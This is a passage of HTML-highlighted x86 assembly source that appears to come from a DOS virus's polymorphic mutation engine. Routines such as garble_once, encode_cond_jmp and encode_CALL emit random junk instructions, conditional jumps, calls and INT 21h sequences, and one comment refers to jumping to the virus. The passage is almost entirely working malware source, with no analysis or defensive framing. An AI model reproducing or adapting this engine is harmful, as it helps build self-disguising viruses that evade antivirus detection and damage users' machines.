    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">garble_more_AX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;garble count = 4..7</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; save garble count</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_once</span><span class="sc0">             </span><span class="sc1">; garble ***MACRO***</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; restore garble count</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">finish_cJMP</span><span class="sc0">             </span><span class="sc1">; if so, finish it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">   </span><span class="sc1">; garble garble</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; check if pending nJMP</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc5">STO_BYTE</span><span class="sc0"> </span><span class="sc5">opRETN</span><span class="sc0">               </span><span class="sc1">; encode a RETN</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">shit</span><span class="sc0">                  </span><span class="sc1">; after RETN - any shit !</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.end_of_jmp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.begin_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">   </span><span class="sc1">; garble</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">           </span><span class="sc1">; do large instruction</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">not_branch_garble_with_save_cx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">finish_cJMP</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; get current location</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.cJMP_patch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get previous location</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; in not open cJmp</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">@@retn</span><span class="sc0">                  </span><span class="sc1">; cJMP_patch == 0? i.e. is</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; there an unfinished cJMP?</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; calculate offset</span><span class="sc0">
        </span><span class="sc5">EXIT</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">not_branch_garble</span><span class="sc0">       </span><span class="sc1">; fill in some instructions</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">                   </span><span class="sc1">; are we close enough?</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">                          </span><span class="sc1">; if so, finish this now</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; if not, encode cJMP $+2</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; patch the cJMP destination</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.cJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; clear usage flag</span><span class="sc0">
</span><span class="sc5">@@retn</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">do_one_byte</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_AX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">onebyte_table</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">                           </span><span class="sc1">; if possible use AX as garbage</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">onebyte_table_ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">xlat</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc5">GOIN</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">        </span><span class="sc1">; DEC or INC ??</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">                 </span><span class="sc1">; all other onebyte command have opcode great 48h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÄ encode Ä branch Ä garbles ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">garble_once</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc6">jp</span><span class="sc0">      </span><span class="sc5">encode_CALL</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">encode_int21</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">encode_cond_jmp</span><span class="sc0">
    </span><span class="sc6">jo</span><span class="sc0">      </span><span class="sc5">not_branch_garble</span><span class="sc0">
    </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">do_one_byte</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_CALL</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">garble_once</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.cJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there an unfinished</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">finish_cJMP</span><span class="sc0">
</span><span class="sc1">;Ä encode jmp near ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_jmp_near</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there an unfinished</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">encode_cond_jmp</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">
</span><span class="sc1">;    jnz     encode_jmp_nearE9 ;&lt; jmp looptop &amp; jmp virus (E9) if relocator</span><span class="sc0">
    </span><span class="sc5">GOIN</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opJMPN</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; save location to patch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sto_min_di_2</span><span class="sc0">
    </span><span class="sc5">DOELSE</span><span class="sc0">                               </span><span class="sc1">; encode JMP register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_wr_and_encode_mov</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.nJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">; save location to patch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_reg</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;ax= 0E0FFh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">shit</span><span class="sc0">                     </span><span class="sc1">; after jmp - any shit ! &lt;&lt;&lt;&lt;&lt;&lt;debug</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.end_of_jmp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">garble_once</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;Ä encode a conditional jmp ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_cond_jmp</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_JMPS</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">garble_once</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.cJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there an unfinished</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">finish_cJMP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
        </span><span class="sc5">MASKA</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010000x0</span><span class="sc0">                </span><span class="sc1">;encode cmp/test before Jx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">force_not_branch_garble</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">@encode_cond_jmp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010b</span><span class="sc0">                       </span><span class="sc1">; don't encode jo/jno/jpo/jpe</span><span class="sc0">
    </span><span class="sc6">jpe</span><span class="sc0">     </span><span class="sc5">@encode_cond_jmp</span><span class="sc0">
    </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111xxxx</span><span class="sc0">              </span><span class="sc1">; encode a conditional jmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; opcode 72..79, 7B..7F</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_CX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">                          </span><span class="sc1">; if possible use CX as garbage</span><span class="sc0">
         </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111000xx</span><span class="sc0">         </span><span class="sc1">; encode a conditional loop/jcxz</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">                            </span><span class="sc1">; opcode E0..E3</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">do_cond_jmp</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.cJMP_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; save target offset</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;Ä encode CALL ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_CALL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_CALL</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">garble_once</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opCALL</span><span class="sc0"> </span><span class="sc1">;&lt;&lt;&lt;debug</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">encode_cond_jmp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.begin_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there one pending?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">encode_cond_jmp</span><span class="sc0">           </span><span class="sc1">; encode cond jmp</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">
    </span><span class="sc5">GOIN</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0">
         </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opCALL</span><span class="sc0">                  </span><span class="sc1">; call near</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.begin_sub</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; calculate CALL offset</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">sto_min_di_2</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DOELSE</span><span class="sc0">                         </span><span class="sc1">; encode CALL register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_wr_and_encode_mov</span><span class="sc0">             </span><span class="sc1">;al-register, cx-value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.begin_sub</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_reg</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">           </span><span class="sc1">; ax=0xD0FF now</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">@@ret</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">not_branch_garble</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">                              </span><span class="sc1">; get random INSTRUCTION</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">        </span><span class="sc1">; mostly do larger instructions normalise</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111110b</span><span class="sc0">        </span><span class="sc1">; random number is it the same as before?</span><span class="sc0">
